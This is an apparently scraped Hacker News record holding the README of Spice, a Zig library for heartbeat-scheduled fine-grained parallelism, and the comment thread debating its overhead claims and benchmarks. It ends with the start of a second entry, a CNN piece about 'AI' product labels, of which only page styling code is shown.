benchmarks.) Table of Contents Using Spice Work-stealing and its inefficiencies Implementation details Optimizing for static dispatch Low-overhead heartbeating signaling Global mutex is fine when there's no contention Branch-free doubly-linked list Minimizing the stack usage Passing values around in registers Benchmarks Acknowledgments Limitations FAQ Using Spice The following example demonstrates how Spice works: const spice = @import(\"spice\"); // (1) Add task as a parameter. fn sum(t: *spice.Task, node: *const Node) i64 { var res: i64 = node.val; if (node.left) |left_child| { if (node.right) |right_child| { var fut = spice.Future(*const Node, i64).init(); // (3) Call `fork` to set up work for another thread. fut.fork(t, sum, right_child); // (4) Do some work yourself. res += t.call(i64, sum, left_child); if (fut.join(t)) |val| { // (5) Wait for the other thread to complete the work. res += val; } else { // (6) ... or do it yourself. res += t.call(i64, sum, right_child); } return res; } res += t.call(i64, sum, left_child); } if (node.right) |right_child| { // (2) Recursive calls must use `t.call` res += t.call(i64, sum, right_child); } return res; } Every parallel function needs to take a task as a parameter. This is used to coordinate the work. You should never call your function directly, but instead use t.call which will call it for you (in the right way). Call fork to set up a piece of work which can be done by a different thread. This can be called multiple times to set up multiple pieces of work. After that your function should do some meaningful work itself. Call join to wait for the work done by the other thread. However, join might return null and this signals that no other thread picked up the work. In this case you must do the work yourself. Here we repeat ourselves in step 3 and 6: Both places we refer to sum and right_child. It's possible to hide this duplication by some helper function, but this example demonstrates a core idea behind Spice: Not every piece of work comes from the queue. You call fork to signal that there's something which can be executed by another thread, but if all the other threads are busy then you fallback to executing it as if the fork never happened. This principle is core to how Spice achieves its low and predictable overhead: If there's no parallelism possible then all Spice is doing on the hot path is pushing and popping the queue (without ever looking at any of the items). The actually coordination with other threads happens on a fixed heartbeat: Every 100 microsecond or so a thread will look at its current work queue and dispatch the top-most item to another waiting thread. Since the heartbeat happens very infrequently (compared to the clock speed) we also don't need to worry so much about what we're doing during the heartbeat. Even if we spend hundreds of nanoseconds the total overhead becomes small since we do it rarely. Work-stealing and its inefficiencies Spice provides the fork/join model which has typically been implementing by using work-stealing. Let's have a look at work-stealing: Every thread have their own local work queue. Every piece of work in the system gets put onto this queue. The same thread will pick up work from this queue and execute it. This might lead to more work being added (onto the same queue). At some point, the local work queue for a thread will become empty. The thread will then attempt to steal work from another thread: It takes a chunk of the work from the end of another thread's queue and places it into its own. Since each thread pulls work from the beginning of its queue and other thread steals from the end, we expect there to be little contention on these queues. However, there's three major sources of inefficiencies in this design: Every piece of work is a dynamic dispatch. In compiled languages (such as C) function calls are \"practically\" free due to the capability of statically knowing everything about the called function. This is a scenario which compilers and CPUs have been optimized for decades to execute efficiently. Work-stealing systems don't use this functionality, but instead puts every piece of work into generic \"call this dynamic function\". It's a small piece of overhead, but it does add up. The \"local\" work queue isn't really local. Yes, it's true that every thread have a single queue that they will push work onto, but this is far from a \"local\" queue as is typically described in concurrent algorithms. This is a queue in which every thread at every point might steal from. In reality, work-stealing systems with N threads have N global queues, where each queue only has a single producer, but everyone is a consumer. Why does this distinction matter? Because all operations on these queues have to use atomic operations. Atomic operations, especially stores, are far more expensive than regular, local stores. Spinning works great … until it doesn't. The queues in work-stealing systems are typically implemented using spinning: Every thread will optimistically try to acquire a single item from the queue, and if there's a contention with another thread it will try again in a loop. This typically gives great performance … until it doesn't. It can be very hard to reason about this or replicate it since under one set of conditions everything is fine, but suddenly during contention the system will slow down to a halt (i.e. 10x-100x slower). Spice directly tackles all of these inefficiencies: The dynamic dispatch of the work queue is only used when work is sent to another thread. Work done within a single thread will use regular function calls outside of the work queue. The work queue is truly local: Pushing to it involves (1) one memory store to a pointer to somewhere on the stack, (2) one memory store to the current stack frame, (3) one register store. None of these operations need to synchronize with other threads. There isn't a single while-loop in Spice which doesn't also contain a wait()-call which will suspend the thread. There is no spinning. Implementation details Let's dive further into how Spice is implemented to achieve its efficient parallelism. Optimizing for static dispatch A fork/join program has a set of code blocks which are executed in parallel and once they finish the join action completes: join( fork { code1 } fork { code2 } fork { code3 } ) In Spice this is represented as: job1 = fork { code1 } // Place on the queue job2 = fork { code2 } // Place on the queue code3 // Run right away if (job2.isExecuting()) { // Job was picked up by another thread. Wait for it. job2.wait() } else { code2 } if (job1.isExecuting()) { // Job was picked up by another thread. Wait for it. job1.wait() } else { code1 } Notice that code1 and code2 has been duplicated_inside the function. This is actually a good thing. Most of the time the job will not be picked up by another thread. In this case, our program nicely turns into the sequential version (although in reverse order) with a few extra branches which are all very predictable. This is friendly both for the code optimizer (e.g. it can now inline the function call) and the CPU. Low-overhead heartbeating signaling The core idea of heartbeat scheduling is to do scheduling locally and at a low frequency: Every 100 microsecond or so we'd like every thread to look at it local work queue and send work to a different thread. The low frequency is key to eliminating overall overhead. If we're only doing something every 100 microsecond we can actually spend 100 nanoseconds (an eternity!) and still only introduce 0.1% overhead. Operating systems have built-in support for signaling, but these are very hard to reason about. The user code gets paused at any random point and it's hard to safely continue running. For this reason, Spice uses a cooperative approach instead: The user code have to call tick() and this detects whether a heartbeat should happen. This function call is automatically called for you whenever you use the call-helper. It's critical that this function is efficient when a heartbeat isn't happening. This is after all the common case (as the heartbeat is only happening every ~100 microsecond). pub inline fn tick(self: *Task) void { if (self.worker.heartbeat.load(.monotonic)) { self.worker.pool.heartbeat(self.worker); } } In Spice we spawn a separate heartbeat thread whose sole purpose is to periodically flip the thread's atomic heartbeat value from false to true. The tick() function then reads this atomic value and starts its heartbeat code when it's true. A key part of reducing the overhead of the ticking is to make sure the heartbeat function itself is marked as cold. This causes the presence of this function call to not use up any registers. Without this the overhead is significantly higher. Global mutex is fine when there's no contention If you look inside the codebase of Spice you will find that each thread pool has a single mutex which is locked all over the place. An immediate reaction would be \"oh no, a global mutex is terrible\" and you might be tempted to replace it. However, there's no problem with a global mutex until you're being blocked. And you can only be blocked if two conditions occur: A thread is holding the lock for a long time. There's concurrent threads trying to acquire the lock at the same time. None of these are true for Spice. The heartbeating ensures that typically only a single thread is executing a heartbeat. In addition, no user code is executed while the lock is held. We're only protecting trivial simple memory reads/writes which will complete in constant time. Branch-free doubly-linked list We're using a doubly-linked list to keep track of the work queue: fork() appends to the end, join() pops from the end (if it's still there), and we pop from the beginning when we want to send work to a background worker. Appending into a doubly-linked list typically looks like this: pub fn append(list: *Self, new_node: *Node) void { if (list.last) |last| { // Insert after last. list.insertAfter(last, new_node); } else { // Empty list. list.prepend(new_node); } } Notice that there's a conditional here: If the list is empty we need to do something special. Most of the time the list will of course not be empty. To eliminate the branch we can make sure that the list is never empty. We define a sentinel node (the \"head\") which always represents the beginning of the list. The tail pointer will start by pointing to this head node. This means that both pushing and popping is completely branch-free and these are operations we do at every recursive function call. Minimizing the stack usage A Future in Spice has two possible states: It's either queued or executing. The heartbeat is responsible for taking a queued future and start executing it. And as we already know: Heartbeating happens rarely so we expect many futures to be queued without executing. An early prototype of Spice used a tagged union to store the future on the stack. This turns out to be suboptimal because (1) stack usage matters for performance (at least in this benchmark) and (2) there's quite a lot of additional state needed to keep track of futures which are executing. To minimize stack usage Spice therefore uses two techniques: Execution state is placed in a separate (pool-allocated) struct. The queued (but not executed) futures therefore does not need to consume any of this space. We manually create a tagged union where we use the fact that the executing state only needs a single pointer while the queued state is guaranteed to have a prev pointer. Whether the first field is null therefore decides which of these it is. (Maybe a smart enough compiler would be able to this optimization for us.) const Future = struct { prev_or_null: ?*anyopaque, next_or_state: ?*anyopaque, } // A future which is _queued_ has: // prev_or_null = pointer to prev future // next_or_state = pointer to next future // A future which is _executing_ has: // prev_or_null = null // next_or_state = ExecuteState const ExecuteState = struct { requester: *Worker, done: std.Thread.ResetEvent = .{}, result: ResultType, // Any number of fields. } Passing values around in registers Spice works with a Task struct which has two fields: A pointer to the owning worker and a pointer to tail of the work queue. For optimal performance these should be passed as registers across all function boundaries. However, with LLVM, passing a struct will very often cause it be passed on the stack. To work around this we define a separate function where worker and job_tail are actual parameters. We place the parameters into a struct and pass a pointer to this into the user-defined function. This function call we make sure is always being inlined: fn callWithContext( worker: *Worker, job_tail: *Job, comptime T: type, func: anytype, arg: anytype, ) T { var t = Task{ .worker = worker, .job_tail = job_tail, }; return @call(.always_inline, func, .{ &t, arg, }); } This causes the callWithContext-function to be the actual function which LLVM works on, and since this has pointers are parameters it will happily pass these directly into registers. Benchmarks The initial development of Spice has been focused around a single benchmark which is described in detail in bench/. Acknowledgments Spice was made possible thanks to the research into heartbeat scheduling: \"The best multicore-parallelization refactoring you've never heard of\" gives an excellent introduction into the concepts of heartbeat scheduling. It's a very short paper which focuses entirely on a single use case, but describes everything in a manner which can be generalized. The solution presented in this paper is based around turning all the code into continuation-passing style which enables switching between sequential and parallel execution. Spice started out as an experiment of this approach, but this turned out to have quite high overhead (>10 nanosecond). Going backwards in time, \"Heartbeat scheduling: provable efficiency for nested parallelism\" was the first paper introducing \"heartbeat scheduling\". This paper provides excellent information about the concepts, but the implementation is based around integrating this into an interpreter and focus is primarily on the theoretical guarantees as opposed to raw performance. \"Task parallel assembly language for uncompromising parallelism\" is a follow-up paper which improves the performance by defining a custom assembly language and using OS signaling for heartbeats. This is a fascinating line of research, but it's difficult to integrate into an existing language. Limitations There's many limitations of the current implementation of Spice: Rough edges when you're using it wrong: Spice is quite peculiar about how it should be used (most notably about fork and join). If you're using it wrong now then weird things could happen. This should be improved by adding more compile-time checking, debug-mode assertions, or changing the overall API. Lack of tests: Spice contains a lot of gnarly concurrent code, but has zero testing coverage. This would have be improved before Spice can be responsibly used for critical tasks. Lack of support for arrays/slices: Probably the most common use case for fine-grained parallelism is to do something for every element of an array/slice. There should be native, efficient support for this use case. Lack of documentation: There's no good documentation of how to use it. Lack of further benchmarks: This has only been tested on a single small benchmark. This benchmark should be quite representative (see bench/ for more details), but further benchmarks are needed to validate these findings. @panic-heavy: Spice is quite optimistic in its error handling and uses @panic extensively. To be considered a proper Zig library there needs to be way more consideration of how error cases are handled. Lack of testing with ReleaseSafe: ReleaseSafe is an extremely nice feature of Zig. Further benchmarking and testing is needed to understand how well Spice can work here. Luckily the whole codebase is ~500 lines so it shouldn't be too difficult to make progress on these areas. There's currently no plans of doing any active development on Spice to improve this (as the original author don't have the time). Any improvements in forks and/or re-implementations in other languages are highly encouraged! FAQ Question: Why is it called \"Spice\"? Answer: This project enables fine-grained parallelism. Sand is extremely fine-grained. Sand forms in dunes. Spice. Also: It's a hot take on parallelism. Question: Why is it implemented in Zig? Answer: Why not? This describes a generic approach to parallelism that should be possible to implement in multiple languages. Maybe I'll end up implementing something similar in another language as well? I don't know yet. If you think this is interesting for your language of choice I would encourage you to explore this area. Question: But if you did it in Rust we could have safe parallelism? Answer: Yeah, that sounds very cool. I'm not at all opposed to it. That said, I've been exploring many different techniques and variants while developing Spice. Many of my initial ideas were definitely not \"safe\" by any means, but I was able to express these ideas in Zig, look at the assembly and measure the performance in benchmarks. I'd probably only be able to explore a fraction of the ideas if I was limited by Rust's strict semantics in the initial phase of this project. If I have to turn this into a production-ready system I might decide to use Rust.",
    "commentLink": "https://news.ycombinator.com/item?id=41230344",
    "commentBody": "Spice: Fine-grained parallelism with sub-nanosecond overhead in Zig (github.com/judofyr)365 points by dsp_person 19 hours agohidepastfavorite45 comments shwestrick 5 hours agoFor those curious, this implementation is based on a recent line of research called \"heartbeat scheduling\" which amortizes the overheads of creating parallelism, essentially accomplishing a kind of dynamic automatic granularity control. Related papers: (2018) Heartbeat Scheduling: Provable Efficiency for Nested Parallelism. https://www.andrew.cmu.edu/user/mrainey/papers/heartbeat.pdf (2021) Task Parallel Assembly Language for Uncompromising Parallelism. https://users.cs.northwestern.edu/~simonec/files/Research/pa... (2024) Compiling Loop-Based Nested Parallelism for Irregular Workloads. https://users.cs.northwestern.edu/~simonec/files/Research/pa... (2024) Automatic Parallelism Management. https://www.cs.cmu.edu/~swestric/24/popl24-par-manage.pdf reply judofyr 3 hours agoparentOh this is super interesting. I was only aware of the two first while writing Spice. I’ll definitely look into the two last as well. Thanks for sharing! reply nirushiv 18 hours agoprevI haven’t read through the code in detail but I can tell you “sub-nanosecond overhead” is misleading and marketing fluff. On first look, the measure seems to be some convoluted “time per thing” where the number of threads is far far smaller than the number of “thing”s reply judofyr 12 hours agoparentAuthor here. I knew that some people would react negatively to the term, but I can assure the intention is for you to have a better understanding of exactly how and when you should use Spice and Rayon. I would recommend reading the benchmark document: https://github.com/judofyr/spice/blob/main/bench/README.md. What people typically do when comparing parallel code is to only compare the sequential/baseline with a parallel version running at all threads (16). Let's use the numbers for Rayon that I got for the 100M case: - Sequential version: 7.48 ns. - Rayon: 1.64 ns. Then they go \"For this problem Rayon showed a 4.5x speed-up, but uses 16 threads. Oh no, this is a bad fit.\" That's very true, but you don't learn anything from that. How can I use apply this knowledge to other types of problems? However, if you run the same benchmark on varying number of threads you learn something more interesting: The scheduler in Rayon is actually pretty good at giving work to separate threads, but the overall work execution mechanism has a ~15 ns overhead. Despite this being an utterly useless program we've learnt something that we can apply later on: Our smallest unit of work should probably be a bit bigger than ~7 ns before we reach for Rayon. (Unless it's more important for use to reduce overall latency at the cost of the throughput of the whole system.) In comparison, if you read the Rayon documentation they will not attempt to give you any number. They just say \"Conceptually, calling join() is similar to spawning two threads, one executing each of the two closures. However, the implementation is quite different and incurs very low overhead\": https://docs.rs/rayon/latest/rayon/fn.join.html. (Also: If I wanted to be misleading I would say \"Spice is twice as fast as Rayon since it gets 10x speed-up compared to 4.5x speed-up\") reply littlestymaar 11 hours agorootparentThanks for the answer, this part is particularly interesting indeed: > Despite this being an utterly useless program we've learnt something that we can apply later on: Our smallest unit of work should probably be a bit bigger than ~7 ns before we reach for Rayon. That's a very interesting project. The big limitation I see with the current approach is that the usability of the library is much worth than what Rayon offers. The true magic of Rayon is that you just replace `iter()` with `par_iter()` in you code and voilà! now you have a parallel execution. But yes it has some overhead, so maybe Rayon could try and implement this kind of scheduling as an alternative so that people pick what works best for their use-case. reply littlestymaar 2 hours agorootparentToo late to edit so I'll put it here: > the usability of the library is much worse than what Rayon I'm a little bit ashamed to see that this fairly upvoted comment of mine has such an stupid English mistake in it… reply mgaunard 10 hours agorootparentprevYou can just divide the speed-up by the number of cores, and that gives you the parallelization efficiency. I've seen systems that can achieve 99% efficiency on thousands on nodes for real useful applications that involve non-trivial synchronization. Now that is an impressive feat. Sure, there is probably some extra latency to get everything running, but for a sufficiently long program run, that is all irrelevant. reply aidenn0 3 hours agorootparent> You can just divide the speed-up by the number of cores, and that gives you the parallelization efficiency. The linked benchmark document does this. 82% for 4 cores on Spice with a small workload, and 69% for 16 cores on Spice with a large workload. Compared to about 25% for Rayon on 4 cores with a small workload and 88% for Rayon on 16 cores with a large workload. > Sure, there is probably some extra latency to get everything running, but for a sufficiently long program run, that is all irrelevant. The entire point of the linked benchmark README.md is to deal with insufficiently long program runs. Spice is an attempt to allow parallelization of very small amounts of work by decreasing fixed overhead. Perhaps such a thing is not useful but that doesn't prevent it from being interesting. reply imtringued 4 hours agorootparentprevAdding more cores doesn't change the time per operation. Your graphs are grossly wrong. What you should have done is drop the nanoseconds and just take the total execution time. Whenever you're writing 1.64ns, you should have written 164ms. The overhead should be measured as a percentage versus a theoretical base line such as perfect linear speedup. You haven't shown the ideal scenario for each core count, so how are we supposed to know how much overhead there really is? The single core scenario is 363ms and linear speedup for 32 cores gives us 11.3ms. Your benchmark says you needed 38ms. This means you achieved 31% of the theoretical performance of the CPU, which mind you is pretty good, especially since nobody has benchmarked what is actually possible while loading all cores by running 32 single threaded copies of the original program, but you're advertising a meaningless \"sub nanosecond\" measure here. reply x-complexity 17 hours agoparentprev> I can tell you “sub-nanosecond overhead” is misleading and marketing fluff If and only if (1-thread Spice - non-parallelized baseline) > 1ns, which their tests back up their claims. https://github.com/judofyr/spice/tree/main/bench reply adrian_b 12 hours agorootparentAt your link it also says: \"Spice shows subpar scalability: The speed-up of using 16 threads was merely ~11x\" If that is true, then \"Spice\" is suitable only for small tasks, which can be completed at most in milliseconds, which can benefit from its low overhead, while for any bigger tasks something better must be used. reply judofyr 11 hours agorootparentAuthor here. I’d maybe phrase it as “Spice is not optimal” instead of “Spice is not suited for”, but yes, that’s the conclusion for this benchmark. I’m hoping/assuming that for a more typical case (more CPU work being done) Spice will scale better, but I haven’t done the benchmark yet. reply mananaysiempre 17 hours agoparentprevThat is the ecological niche of Rayon (cited) as well, isn’t it? You need to process a lot of things (thousands to millions), you want to parallelize that processing as much as possible (couple dozen of cores tops), you want to not get killed by scheduling overhead. So you account for the per-thing overhead. reply CyberDildonics 17 hours agorootparentAnything can have its overhead amortized, but claiming that amortization as your actual overhead is just a lie. reply hansvm 15 hours agorootparentMost engineers aren't precise with throughput vs latency. Ideally you should report both figures (and anything else salient in performance-sensitive spaces), but it's less a lie and more an extremely commonplace mode of thinking and speaking. Moreover, I think that mode of thought comes from the fact that most programming problems don't have hard latency bounds, so throughput dominates the conversation. If I'm spending 10us on average while handling a 10ms soft deadline, every single component can easily be occasionally 100x more expensive (latency) without me caring, and if it buys me another 1us on average (throughput) then I'll save gobs of money in compute. reply Dylan16807 14 hours agorootparentIf you're trying to split a sub-second task across multiple threads, then latency is probably your main concern. reply hansvm 12 hours agorootparentKind of, but not in a way that matters for this scheduler (at least, I posit, not usually). If you have a single task with a wall-clock time in the 10-1000ms range and want to make it \"faster,\" yes, you probably want to improve the latency. However, the latency introduced by this experimental library is negligible on the timescales being considered. With that in mind, a throughput improvement is a better description of the sorts of engineering efforts you need to accomplish your goals. From a slightly different perspective, one thing the library does on top of handling small workloads well is handling _finely grained_ workloads. That's super important from a usability point of view, since you can express the parallelism in the most natural way and let the library handle the fact that it's hard to schedule that task (e.g., most schedulers suck as soon as you're talking about work items on the order of a single cache line). Just being able to have a convenient abstraction when writing a long-running job is also a fantastic feature. In that case, we would still care about throughput, not latency. Separately, though definitely more rarely, there are jobs which are sub-second but where it's hard to batch many of them at once. If you're forced to execute many and care about the time till completion (latency, again at a much longer timescale), being able to make each one much faster is a big deal. I really think that first paragraph is a commonplace occurrence though. Something important is slow (measured in \"human\" blinking timescales), so you slap a better scheduler and some parallelism at it and start work on the next ticket. Ripgrep, at some level (it has lots of other technical accomplishments; I don't want to let this comment give the mistaken impression that I'm demeaning the project) is useful precisely because it throws parallelism at sub-second problems. reply CyberDildonics 14 hours agorootparentprevMost engineers aren't precise with throughput vs latency. Anyone making claims about performance should know the difference. This isn't even about either, it's lying about overhead by not counting it correctly. If someone asks what your cable bill is and you say it's only $2.50 a month because you have 32 TVs, no one is going to say that makes sense. reply hansvm 12 hours agorootparentIt's not \"lying\" to use the words most likely to correctly get your point across to your target audience. Maybe they could have communicated better (for a seemingly dead project, IMO they put enough time in regardless), but it's not lying. > Anyone making claims about performance should know the difference. They probably do know the difference. Knowing the difference isn't the thing you're quibbling with. > If someone asks what your cable bill is and you say it's only $2.50 a month because you have 32 TVs, no one is going to say that makes sense. Sure...because when asking about your cable bill it's unambiguous that you want the total number of dollars. The whole reason there's any issue at all here is that some of their language is ambiguous if you don't consider the target audience and don't analyze their charts or read the descriptions of those charts. Picking an analogy which resonates precisely because of the lack of ambiguity doesn't say a whole lot about the actual problem at hand. reply CyberDildonics 2 hours agorootparentThe whole point of overhead is that it is a base constant on top of whatever you do. The whole point of overhead is to eventually be amortized in some way. When someone asks what the overhead is, it is a lie to try to factor amortization in because it's implied that it will be done somewhere anyway. reply jnordwick 14 hours agoparentprevYesterday, he posted on Reddit and I expressed some concern with the benchmarks. The benchmarks are claiming 0.36 ns of overhead per call, but only the computing function. There is a second thread running doing the schedule that the overhead numbers don't include. It seems pretty clear he's running on a hyperthreaded 8 core machine (so 16 threads), I was guessing 3 Ghz, so that literally a single cycle of overhead. Each extra thread adds more overhead from lock contention. At 16 threads overhead is up to 3.6 ns (so 10 times more). I'm guessing, but that would mean the 0.36 ns of overhead included an uncontested lock? That's not possible. There's some other weirdness going on in the benchmark data too. So either I'm not understanding what he's actually timing or maybe there is a bug in the benchmark code. Also, if you multiply all the values out, I think he's timing in milliseconds (when runtime is calculated and converted to millis, they come out as whole numbers). Don't most benchmarkers have better precision than that? Maybe he's just using `time prog` and the data is just really dirty. Or maybe he's just choosing really, really bad metrics that totally useless for this (this is probably correct, just not sure if there are more issues). reply Veedrac 13 hours agorootparentI don't understand why it's unbelievable. They walk through the required logic to perform scheduling and dispatch; it looks incredibly simple and extremely suited to hiding on an OoO. The benchmark is summing down a binary tree which is going to give you a lot of space to hide what's at most a handful of instructions. There's obviously no lock contention because, like, look at the algorithm, what locks contending on what? AFAICT this is just a really cool and really practical algorithm for microthreads with near zero cost per semantic thread. reply chc4 12 hours agorootparent> There's obviously no lock What? The threadpool has a shared mutex accessed by each worker thread, which is used for pushing work on heartbeat and for dequeuing work. https://github.com/judofyr/spice/blob/167deba6e4d319f96d9d67... \"Adding more threads to the system will not make your program any slower\" is an insane claim to be making for any lightweight task scheduling system, and trivially not true looking at this: if you have 1000 threads as workers and degenerate tree program than each worker will take turns serializing themselves through the mutex. Things like these are massive red flags to anyone reading the README. reply Veedrac 11 hours agorootparentThe README covers this. Its argument is persuasive. If your point is that the constant is badly tuned for theoretical 1000 core machines that don't exist, I'm not sure I care. A 100ns stall at most every 100us becoming more likely when you approach multiple hundreds of cores is hardly a disaster. In the context of the comment I replied to, the difference between 8 and 16 workers is literally zero, as the wakeups are spaced so the locks will never conflict. Actually, if you did have a 32k core machine somehow with magical sufficiently-uniform memory for microthreading to be sensible for it, I think it's not even hard to extend the algorithm to work with that. Just put the workers on a 3D torus and only share orthogonally. It means you don't have perfect work sharing, but I'm also pretty sure it doesn't matter. reply imtringued 12 hours agorootparentprevThe lock is acquired every 100 microseconds and it is expected that only one thread accesses it at a time. reply jnordwick 9 hours agorootparentI know. But I have no other explanation as to the latency increase that is seen as the number of threads increases. Do you have a better theory? reply audunw 5 hours agoparentprevDid you read the README at all? I thought it was extremely precise about what exactly is meant by the claim in the title. Not much room for misunderstanding. The title is totally fine. There is no title with zero room for misinterpretation. All I took from it is that it's a library with extreme low latency by some kind of measure.. and then I went to the readme to see exactly what that measure was. Very straightforward. reply lcof 10 hours agoprevInteresting research work! Besides the code itself, there is some good reasoning and the documentation is well written The 2018 paper on heartbeat scheduling is also an interesting read https://www.andrew.cmu.edu/user/mrainey/papers/heartbeat.pdf reply akovaski 15 hours agoprevI'm not terribly familiar with this space, but I do like the concurrency model presented here. I think the README here is very well written, and I have a good idea of what's going on just from reading it, but there are a few areas where I'm left scratching my head. Thankfully the code is fairly easy to read. reply geertj 4 hours agoprevPer the description this uses busy waiting in the workers to get to nanosecond level latencies. I wonder if anyone has a perspective on how realistic busy waiting is in large applications with tens of thousands of tasks? Maybe it works if the tasks are async (i.e. not thread based) so that you only have N waiters where N is the size of the executor’s thread pool? In any case energy consumption of such an architecture would be higher. Related, I’ve been interested a while whether there’s a faster way for a producer of work to have a consumer wake up without resorting to busy waiting, possibly by running the consumer in the producer time slice. Also related, I’ve wondered if it’s possible to have a user space FUTEX_WAKE operation that would halve the typical penalty of waking up a consumer (to just the consumer). reply shoggouth 18 hours agoprevList of limitations of the project: https://github.com/judofyr/spice?tab=readme-ov-file#limitati... reply jd3 17 hours agoparentWant to state off the bat this this project is awesome and huge kudos to the author for spending their time, attention, and energy 1) working diligently to get this working at all and 2) sharing it with the broader HN community, who are generally known to by hyper-critical to a pedantic degree and/or overly pessimistic (cough the initial Docker project Show HN thread cough) I also really appreciate that the author recognizes the limits of their own project, which preemptively addresses most of the usual snark. > Lack of tests: Spice contains a lot of gnarly concurrent code, but has zero testing coverage. This would have be improved before Spice can be responsibly used for critical tasks. Testing correctness of execution for critical tasks is one thing, but I would expect a library which implements \"gnarly concurrent code\" to at least have regression tests — what guarantee is there to an end-user that functionality which exists in a working state today might not break tomorrow due to a subtle yet nefarious regression? sqlite has 590 times as much test code and test scripts as it does raw c source code [0]; this fact, along with its stability and portability, is one of the numerous reasons why it has proliferated to become the defacto embedded database used across the planet. While we're comparing apples to oranges in this contrived example, the general point still stands — regression tests beget stability and confidence in a project. In epics where I work, if we _must_ defer baseline regression tests, we usually create a follow-up ticket inside of the same epic to at least write them before feature/epic launch, usually. [0]: https://www.sqlite.org/testing.html reply stareatgoats 6 hours agorootparent> (cough the initial Docker project Show HN thread cough) Docker was largely met with enthusiasm here when it was launched. I believe you must refer to how Dropbox was received — famously negatively, initially. reply WaffleIronMaker 5 hours agorootparentYeah, that seems right: April 5, 2007: \"Show HN, Dropbox\" https://news.ycombinator.com/item?id=8863 reply pverghese 17 hours agorootparentprevYou are welcome to add it. This is a proof of concept reply jd3 17 hours agorootparent> Spice is primarily a research project. Read along to learn more about it, but if you're considering using it in production you should be aware of its many limitations. Ah, I missed that upon first read. In that case, that caveat/limitation is definitely justified. reply dagw 6 hours agorootparentprevHN community, who are generally known to by hyper-critical to a pedantic degree and/or overly pessimistic (cough the initial Docker project Show HN thread cough) So you made me dig up the announcement, and contrary to how you recall, it is almost universally positive. https://news.ycombinator.com/item?id=5408002 reply dsp_person 17 hours agorootparentprev> sharing it with the broader HN community Note that I posted this, but I am not the author reply gyrovagueGeist 14 hours agoprevThis is neat and links to some great papers. I wish the comparison was with OpenMP tasks though; I’ve heard Rayon has a reputation for being a bit slow reply raggi 17 hours agoprevcooperative scheduling is the basis for so many patterns with great metrics :) reply nine_k 17 hours agoparentBut it's not very cooperative, as in tasks yielding to each other. They mostly cooperate by letting some tasks to be given to other threads, and not all the time, but once in a heartbeat. The scheduling happens rarely, so its amortized cost is low. reply raggi 15 hours agorootparentsure, but that's all details, and there are other cooperative scheduling models which aren't excessively eager. this isn't to be a downer on this implementation, or other implementations, but just generally pointing at cooperative advantages, of which there are many, with one particular implicit and major downside, which is starvation when the cooperation contract is not adhered to. reply assafe 12 hours agoprevThis is great! reply dsp_person 19 hours agoprevsee also readme under bench https://github.com/judofyr/spice/blob/main/bench/README.md reply pgt 9 hours agoprev [–] Not to be confused with SpiceDB by AuthZed: https://authzed.com/spicedb reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Spice introduces efficient parallelism in the Zig programming language with sub-nanosecond overhead using heartbeat scheduling.",
      "It avoids common pitfalls of parallelism frameworks by using static dispatch and cooperative heartbeating, ensuring minimal stack usage and no thread contention.",
      "Despite its efficiency, Spice is a research project with limitations, including rough edges, lack of tests, and limited benchmarks, encouraging further development and exploration in other languages."
    ],
    "commentSummary": [
      "Spice is a new implementation in the Zig programming language that focuses on fine-grained parallelism with sub-nanosecond overhead, based on \"heartbeat scheduling\" for dynamic automatic granularity control.",
      "The project aims to reduce fixed overhead, making it suitable for parallelizing very small tasks, and shows significant efficiency improvements compared to existing solutions like Rayon.",
      "The author acknowledges the limitations and ongoing research nature of Spice, with detailed benchmarks and comparisons available in the README document on GitHub."
    ],
    "points": 365,
    "commentCount": 45,
    "retryCount": 0,
    "time": 1723503697
  },
  {
    "id": 41231731,
    "title": "Study shows that tacking the “AI” label on products may drive people away",
    "originLink": "https://www.cnn.com/2024/08/10/business/brands-avoid-term-customers/index.html",
    "originBody": "body,h1,h2,h3,h4,h5{font-family:cnn_sans_display,helveticaneue,Helvetica,Arial,Utkal,sans-serif}:root{--web-large-type-body-2-400-font-family:cnn_sans_display;--web-large-type-body-2-400-font-size:16px;--web-large-type-body-2-400-font-style:Regular;--web-large-type-body-2-400-line-height:28px;--web-large-type-body-2-400-letter-spacing:0px;--web-large-type-body-2-400-text-decoration:NONE;--web-large-type-body-2-400-font-weight:400;--web-large-type-other-timestamp-400-font-family:cnn_sans_display;--web-large-type-other-timestamp-400-font-size:14px;--web-large-type-other-timestamp-400-font-style:Regular;--web-large-type-other-timestamp-400-line-height:20px;--web-large-type-other-timestamp-400-letter-spacing:0%;--web-large-type-other-timestamp-400-text-decoration:NONE;--web-large-type-other-timestamp-400-font-weight:400;--style-type-primary-4-low:#6e6e6eff;--style-type-primary-1-highest:#0c0c0cff;--web-large-type-other-author-link-400-font-family:cnn_sans_display;--web-large-type-other-author-link-400-font-size:14px;--web-large-type-other-author-link-400-font-style:Regular;--web-large-type-other-author-link-400-line-height:20px;--web-large-type-other-author-link-400-letter-spacing:0%;--web-large-type-other-author-link-400-text-decoration:NONE;--web-large-type-other-author-link-400-font-weight:400;--component-link-byline-color:#6e6e6eff;--web-large-type-body-italics-1-400-font-family:cnn_sans_display;--web-large-type-body-italics-1-400-font-size:16px;--web-large-type-body-italics-1-400-font-style:Italic;--web-large-type-body-italics-1-400-line-height:24px;--web-large-type-body-italics-1-400-letter-spacing:0px;--web-large-type-body-italics-1-400-text-decoration:NONE;--web-large-type-body-italics-1-400-font-weight:400;--web-large-type-title-1-700-font-family:cnn_sans_display;--web-large-type-title-1-700-font-size:42px;--web-large-type-title-1-700-font-style:Bold;--web-large-type-title-1-700-line-height:48px;--web-large-type-title-1-700-letter-spacing:0px;--web-large-type-title-1-700-text-decoration:NONE;--web-large-type-title-1-700-font-weight:700;--web-large-type-title-2-700-font-family:cnn_sans_display;--web-large-type-title-2-700-font-size:30px;--web-large-type-title-2-700-font-style:Bold;--web-large-type-title-2-700-line-height:36px;--web-large-type-title-2-700-letter-spacing:0px;--web-large-type-title-2-700-text-decoration:NONE;--web-large-type-title-2-700-font-weight:700;--color-base-transparencies-white-90-percent:#ffffffe6;--color-base-transparencies-white-80-percent:#ffffffcc;--color-base-transparencies-white-70-percent:#ffffffb3;--color-base-transparencies-white-60-percent:#ffffff99;--color-base-transparencies-white-50-percent:#ffffff80;--color-base-transparencies-white-40-percent:#ffffff66;--color-base-transparencies-white-30-percent:#ffffff4d;--color-base-transparencies-white-20-percent:#ffffff33;--color-base-transparencies-white-10-percent:#ffffff1a;--color-base-transparencies-white-0-percent:#ffffff00;--color-base-transparencies-black-90-percent:#000000e6;--color-base-transparencies-black-80-percent:#000000cc;--color-base-transparencies-black-